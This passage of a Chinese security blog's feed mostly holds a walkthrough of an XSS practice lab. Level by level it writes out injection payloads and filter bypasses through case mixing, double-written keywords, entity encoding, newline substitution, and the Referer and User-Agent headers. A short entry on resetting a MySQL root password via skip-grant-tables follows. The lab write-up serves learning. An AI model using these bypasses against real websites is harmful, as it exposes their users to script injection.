class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39; onmouseover&#x3D;javascript:alert(1) &#39;</span><br></pre></td></tr></table></figure><p> 与原语句形成闭合：<br> <img src="https://img-blog.csdnimg.cn/20201005212057905.png#pic_center" alt="在这里插入图片描述"><br> 由于输入输入框输入之后，保留了输入的内容，<code>onmouseover</code>属性也会被保留在<code>input</code>标签中，<code>onmouseover</code>的触发条件是当鼠标移动到<code>input</code>标签上，测试如下：<br><img src="https://img-blog.csdnimg.cn/20201006083401519.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zNzUxNjY3NQ==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h1 id="level4"><a href="#level4" class="headerlink" title="level4"></a>level4</h1><p><img src="https://img-blog.csdnimg.cn/20201006084411693.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zNzUxNjY3NQ==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>level4和level3雷同，只是<code>input</code>标签内用于闭合的的引号为<code>&quot;</code>而非level3中的<code>&#39;</code>，只需要将level3中payload里面的<code>&#39;</code>换成<code>&quot;</code>即可：<code>&quot; onmouseover=javascript:alert(1) &quot;</code><br><img src="https://img-blog.csdnimg.cn/20201006085356695.png#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20201006085320606.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zNzUxNjY3NQ==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h1 id="level5"><a href="#level5" class="headerlink" title="level5"></a>level5</h1><p><img src="https://img-blog.csdnimg.cn/20201006090727172.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zNzUxNjY3NQ==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>看似和level4雷同：<br><img src="https://img-blog.csdnimg.cn/2020100609283187.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zNzUxNjY3NQ==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>使用payload<code>&quot; onmouseover=javascript:alert(1) &quot;</code>进行测试，发现<code>&lt;input&gt;</code>标签内<code>onmouseover</code>属性被下划线（<code>_</code>）分割：</p><p><img src="https://img-blog.csdnimg.cn/20201006093046295.png#pic_center" alt="在这里插入图片描述"><br>经测试：<code>&lt;script&gt;</code>，<code>onclick</code>等均会被分隔，使用大小写混合也没有办法绕过：<br><img src="https://img-blog.csdnimg.cn/20201006093923166.png#pic_center" alt="在这里插入图片描述"><br>故这里需避免使用<code>&lt;script&gt;</code>标签和事件属性的方法，尝试使用<code>&lt;a&gt;</code>标签进行测试，构造如下payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;a href&#x3D;&quot;javascript:alert(&#x2F;xss&#x2F;)&quot;&gt;link&lt;&#x2F;a&gt; &lt;&quot;</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20201006095947757.png#pic_center" alt="在这里插入图片描述"><br>通过构造独立出来一个<code>&lt;a&gt;</code>标签，通过点击可实现测试成功：<br><img src="https://img-blog.csdnimg.cn/20201006095835654.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zNzUxNjY3NQ==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h1 id="level6"><a href="#level6" class="headerlink" title="level6"></a>level6</h1><p><img src="https://img-blog.csdnimg.cn/20201006102659211.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zNzUxNjY3NQ==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>源码如下：<br><img src="https://img-blog.csdnimg.cn/20201006102845861.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zNzUxNjY3NQ==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>level6看似相同于level，首先使用level5的payload对level6进行测试，但是<code>href</code>被分隔开了：<br><img src="https://img-blog.csdnimg.cn/20201006103358645.png#pic_center" alt="在这里插入图片描述"><br>变换<code>href</code>大小写：<code>&quot;&gt;&lt;a hRef=&quot;javascript:alert(&#39;test&#39;)&quot;&gt;link&lt;/a&gt;&lt;&quot;</code>，绕过成功：<br><img src="https://img-blog.csdnimg.cn/20201006110121607.png#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20201006110038302.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zNzUxNjY3NQ==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h1 id="level7"><a href="#level7" class="headerlink" title="level7"></a>level7</h1><p><img src="https://img-blog.csdnimg.cn/20201006111015308.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zNzUxNjY3NQ==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>使用level6的payload测试，发现<code>href</code>和<code>script</code>字样被替换为空了：<br><img src="https://img-blog.csdnimg.cn/2020100613292941.png#pic_center" alt="在这里插入图片描述"><br>尝试双写绕过：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;a hRhrefef&#x3D;&quot;javascriscriptpt:alert(&#39;test&#39;)&quot;&gt;link&lt;&#x2F;a&gt;&lt;&quot;</span><br></pre></td></tr></table></figure><p>测试成功：<br><img src="https://img-blog.csdnimg.cn/20201006110918377.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zNzUxNjY3NQ==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h1 id="level8"><a href="#level8" class="headerlink" title="level8"></a>level8</h1><p><img src="https://img-blog.csdnimg.cn/20201006152519195.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zNzUxNjY3NQ==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>查看源码，有<code>input</code>标签和<code>a</code>标签两个位置可以显示输入的语句：<br><img src="https://img-blog.csdnimg.cn/20201006134301902.png#pic_center" alt="在这里插入图片描述"><br>首先对第一处尝试测试，使用level5的payload尝试：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;a href&#x3D;&quot;javascript:alert(&#x2F;xss&#x2F;)&quot;&gt;link&lt;&#x2F;a&gt; &lt;&quot;</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20201006153217861.png#pic_center" alt="在这里插入图片描述"><br>payload内的符号均被实体化编码了，并且<code>script</code>字样被下划线分隔开来，接下来对第二处构造payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javascript:alert(1)</span><br></pre></td></tr></table></figure><p>并且对payload进行unicode编码，构成：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;center&gt;&lt;BR&gt;&lt;a href&#x3D;&quot;&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;&quot;&gt;友情链接&lt;&#x2F;a&gt;&lt;&#x2F;center&gt;</span><br></pre></td></tr></table></figure><p>测试成功：<br><img src="https://img-blog.csdnimg.cn/20201006155558580.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zNzUxNjY3NQ==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20201006155349903.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zNzUxNjY3NQ==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h1 id="level9"><a href="#level9" class="headerlink" title="level9"></a>level9</h1><p><img src="https://img-blog.csdnimg.cn/2020100710160795.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zNzUxNjY3NQ==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>输入“11111111”内容，源码内显示链接不合法：<br><img src="https://img-blog.csdnimg.cn/20201006170547398.png#pic_center" alt="在这里插入图片描述"><br>经多次测试发现，带有<code>http://</code>字样的payload才被识别为正常输入：<br><img src="https://img-blog.csdnimg.cn/2020100709032732.png#pic_center" alt="在这里插入图片描述"><br>推测后端对输入做了检查，只有带<code>http://</code>才合法，因此我们的payload内需要包含<code>http://</code>字样，构造如下payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javascript:alert(&#39;http:&#x2F;&#x2F;&#39;)</span><br></pre></td></tr></table></figure><p>但是script关键字还是被分割：<br><img src="https://img-blog.csdnimg.cn/20201006170347514.png#pic_center" alt="在这里插入图片描述"><br>使用Unicode编码对<code>script</code>编码或其中一个字母编码（这里对<code>c</code>进行编码）后测试：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javas&amp;#99;ript:alert(&#39;http:&#x2F;&#x2F;&#39;)</span><br></pre></td></tr></table></figure><p>测试成功：<br><img src="https://img-blog.csdnimg.cn/20201007103658504.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zNzUxNjY3NQ==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h1 id="level10"><a href="#level10" class="headerlink" title="level10"></a>level10</h1><p><img src="https://img-blog.csdnimg.cn/20201007152810265.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zNzUxNjY3NQ==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>观察可知keyword参数值会被实体化编码，咋一看除keyword参数外没有其他可利用的输入位置，但是查看源码发现有三个隐藏的输入框：<br><img src="https://img-blog.csdnimg.cn/20201007155130753.png#pic_center" alt="在这里插入图片描述"><br>分别使用get方式向提交三个输入框的参数：<br><img src="https://img-blog.csdnimg.cn/20201007155846149.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zNzUxNjY3NQ==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>发现只有<code>t_sort</code>参数有反应，那么就在这个参数上做工作，构造payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot; onmouseover&#x3D;javascript:alert(1) &quot; type&#x3D;&quot;text</span><br></pre></td></tr></table></figure><p>测试成功：<br><img src="https://img-blog.csdnimg.cn/20201007160528755.png#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20201007160317516.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zNzUxNjY3NQ==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h1 id="level11"><a href="#level11" class="headerlink" title="level11"></a>level11</h1><p><img src="https://img-blog.csdnimg.cn/20201007174847842.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zNzUxNjY3NQ==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>查看源码，发现有一个<code>t_ref</code>参数值为跳转的前一跳URL，推测参数值来源于请求包中Referer值，故通过操作Referer值来测试：<br><img src="https://img-blog.csdnimg.cn/20201007175056948.png#pic_center" alt="在这里插入图片描述"><br>更改原Referer值为payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot; onmouseover&#x3D;javascript:alert(1) &quot; type&#x3D;&quot;text</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/2020100718151128.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zNzUxNjY3NQ==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>测试成功通过：<br><img src="https://img-blog.csdnimg.cn/20201007181556982.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zNzUxNjY3NQ==,size_16,color_FFFFFF,t_70#pic_center" alt="  "></p><h1 id="level12"><a href="#level12" class="headerlink" title="level12"></a>level12</h1><p><img src="https://img-blog.csdnimg.cn/20201007184150917.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zNzUxNjY3NQ==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>level12雷同于level11，因为经过分析发现，请求包中User-Agent值可操作：<br><img src="https://img-blog.csdnimg.cn/20201007184332699.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zNzUxNjY3NQ==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>构造同level11的payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot; onmouseover&#x3D;javascript:alert(1) &quot; type&#x3D;&quot;text</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20201007185025795.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zNzUxNjY3NQ==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20201007185116272.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zNzUxNjY3NQ==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h1 id="level13"><a href="#level13" class="headerlink" title="level13"></a>level13</h1><p><img src="https://img-blog.csdnimg.cn/20201007185708605.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zNzUxNjY3NQ==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20201007185738273.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zNzUxNjY3NQ==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h1 id="level14"><a href="#level14" class="headerlink" title="level14"></a>level14</h1><p>这一关貌似环境出问题了，调用的链接失效了：<br><img src="https://img-blog.csdnimg.cn/20201007190855524.png#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20201007190933413.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zNzUxNjY3NQ==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>放后面再进行研究。</p><h1 id="level15"><a href="#level15" class="headerlink" title="level15"></a>level15</h1><p><img src="https://img-blog.csdnimg.cn/20201007221052459.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zNzUxNjY3NQ==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述">)<img src="https://img-blog.csdnimg.cn/20201007221511200.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zNzUxNjY3NQ==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>这里引用了angular.min.js javascript框架。<br>然后在网上找到了这个框架的包含模块资料，也就是ng-include，类似于文件包含这么一个功能，并且有以下一些特点：<br>ng-include可以包含一个html文件（但不限于html文件）， 但只是加载一个静态页面显示在前端，不会加载里面的js。<br>使用时要在文件名要用单引号包起来。<br>ng-include不仅能引进其他文件显示在当前界面，对其的参数提交操作也能显示。<br>ng-include限制了不能加载自带的js,需要载入后二次触发才可以触发。<br>构造如下payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39;level1.php?name&#x3D;&lt;a href&#x3D;javascript:alert(1)&gt;click&lt;&#x2F;a&gt;&#39;</span><br></pre></td></tr></table></figure><p>测试成功：<br><img src="https://img-blog.csdnimg.cn/20201007212901482.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zNzUxNjY3NQ==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h1 id="level16"><a href="#level16" class="headerlink" title="level16"></a>level16</h1><p><img src="https://img-blog.csdnimg.cn/20201008130113637.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zNzUxNjY3NQ==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>提交<code>test&lt;script&gt;alert(1)&lt;/script&gt;</code>值作为payload给<code>keyword</code>，发现后台替换了<code>script</code>为空格，并且给实体化编码了，但是尖括号依旧可以使用：<br><img src="https://img-blog.csdnimg.cn/20201008153338635.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zNzUxNjY3NQ==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>更换<code>img</code>标签并且使用换行(<code>%0a</code>)来替换空格，构造新的payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img%0asrc&#x3D;x%0aonerror&#x3D;alert(1)&gt;</span><br></pre></td></tr></table></figure><p>测试成功：<br><img src="https://img-blog.csdnimg.cn/20201008160741737.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zNzUxNjY3NQ==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h1 id="level17"><a href="#level17" class="headerlink" title="level17"></a>level17</h1><p>可以看到 <code>&lt;embed&gt;</code> 标签， 标签定义嵌入的内容，比如插件。这里嵌入了 swf 格式也就是 flash 专用格式。这里直接插入事件payload即可：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%0aonmouseover%3dalert(1)</span><br></pre></td></tr></table></figure><p>测试成功：<br><img src="https://img-blog.csdnimg.cn/20201008163212948.png#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20201008162822943.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zNzUxNjY3NQ==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h1 id="level18"><a href="#level18" class="headerlink" title="level18"></a>level18</h1><p><img src="https://img-blog.csdnimg.cn/20201008163721753.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zNzUxNjY3NQ==,size_16,color_FFFFFF,t_70#pic_center" alt=" "><br>看源码与level17雷同：<br><img src="https://img-blog.csdnimg.cn/20201008163756662.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zNzUxNjY3NQ==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>level17payload可用：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">onmouseover&#x3D;alert(1)</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20201008164634540.png#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/2020100816450590.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zNzUxNjY3NQ==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h1 id="level19-level20"><a href="#level19-level20" class="headerlink" title="level19/level20"></a>level19/level20</h1><p>两道flash XSS，暂且在能力范围外，改天回头研究。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;@&lt;a href=&quot;目录&quot;&gt;TOC&lt;/a&gt;&lt;/p&gt;
&lt;h1 id=&quot;level1&quot;&gt;&lt;a href=&quot;#level1&quot; class=&quot;headerlink&quot; title=&quot;level1&quot;&gt;&lt;/a&gt;level1&lt;/h1&gt;&lt;p&gt;&lt;img src=&quot;https://img-blo
      
    
    </summary>
    
    
      <category term="渗透" scheme="https://s40d1.github.io/categories/%E6%B8%97%E9%80%8F/"/>
    
      <category term="Web渗透" scheme="https://s40d1.github.io/categories/%E6%B8%97%E9%80%8F/Web%E6%B8%97%E9%80%8F/"/>
    
      <category term="学习笔记" scheme="https://s40d1.github.io/categories/%E6%B8%97%E9%80%8F/Web%E6%B8%97%E9%80%8F/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
  </entry>
  
  <entry>
    <title>重置mysql密码的一种方法</title>
    <link href="https://s40d1.github.io/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93/%E9%87%8D%E7%BD%AEmysql%E5%AF%86%E7%A0%81%E7%9A%84%E4%B8%80%E7%A7%8D%E6%96%B9%E6%B3%95/"/>
    <id>https://s40d1.github.io/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93/%E9%87%8D%E7%BD%AEmysql%E5%AF%86%E7%A0%81%E7%9A%84%E4%B8%80%E7%A7%8D%E6%96%B9%E6%B3%95/</id>
    <published>2020-09-22T13:12:31.469Z</published>
    <updated>2020-09-22T13:09:09.387Z</updated>
    
    <content type="html"><![CDATA[<p>如果遇到mysql忘记密码的时候，可以尝试以下这种方式：<br>以下是需要修改root密码的过程步骤：<br>1、修改 /etc/my.cnf，在 [mysqld] 小节下添加一行：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">skip-grant-tables&#x3D;1</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200922202056391.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zNzUxNjY3NQ==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>这一行配置让 mysqld 启动时不对密码进行验证<br>2、重启 mysqld 服务：<code>systemctl restart mysqld</code><br><img src="https://img-blog.csdnimg.cn/20200922203038804.png#pic_center" alt="在这里插入图片描述"><br>3、使用 root 用户登录到 mysql：<code>mysql -u root</code><br><img src="https://img-blog.csdnimg.cn/2020092220370635.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zNzUxNjY3NQ==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>4、切换到mysql数据库，更新 user 表：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">update user set authentication_string &#x3D; password(&#39;root&#39;), password_expired &#x3D; &#39;N&#39;, password_last_changed &#x3D; now() where user &#x3D; &#39;root&#39;;</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200922203918476.png#pic_center" alt="在这里插入图片描述"><br>在之前的版本中，密码字段的字段名是 password，5.7版本改为了 <code>authentication_string</code>。<br>5、刷新权限使得修改密码生效</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; flush privileges;</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200922205712552.png#pic_center" alt="在这里插入图片描述"><br>6、退出 mysql，编辑 <code>/etc/my.cnf 文件</code>，删除 <code>skip-grant-tables=1</code> 的内容。<br><img src="https://img-blog.csdnimg.cn/20200922205921995.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zNzUxNjY3NQ==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>6、重启 mysqld 服务<br><img src="https://img-blog.csdnimg.cn/20200922205942487.png#pic_center" alt="在这里插入图片描述"><br>7、再用新密码登录即可。<br><img src="https://img-blog.csdnimg.cn/20200922205959874.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zNzUxNjY3NQ==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>注意：<code>skip-grant-tables</code>参数是会让mysql在登录的时候跳过验证表直接登录到数据库，没特殊情况建议不要将该参数留在数据库配置文件中</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;如果遇到mysql忘记密码的时候，可以尝试以下这种方式：&lt;br&gt;以下是需要修改root密码的过程步骤：&lt;br&gt;1、修改 /etc/my.cnf，在 [mysqld] 小节下添加一行：&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;t
      
    
    </summary>
    
    
      <category term="数据库" scheme="https://s40d1.github.io/categories/%E6%95%B0%E6%8D%AE%E5%BA%93/"/>
    
    
  </entry>
  
  <entry>
    <title>记一次Mac挖矿病毒的处置</title>
    <link href="https://s40d1.github.io/wiki/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E8%AE%B0%E4%B8%80%E6%AC%A1Mac%E6%8C%96%E7%9F%BF%E7%97%85%E6%AF%92%E7%9A%84%E5%A4%84%E7%BD%AE/"/>
    <id>https://s40d1.github.io/wiki/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E8%AE%B0%E4%B8%80%E6%AC%A1Mac%E6%8C%96%E7%9F%BF%E7%97%85%E6%AF%92%E7%9A%84%E5%A4%84%E7%BD%AE/</id>
    <published>2020-09-16T05:52:48.905Z</published>
    <updated>2020-10-05T07:08:32.361Z</updated>
    
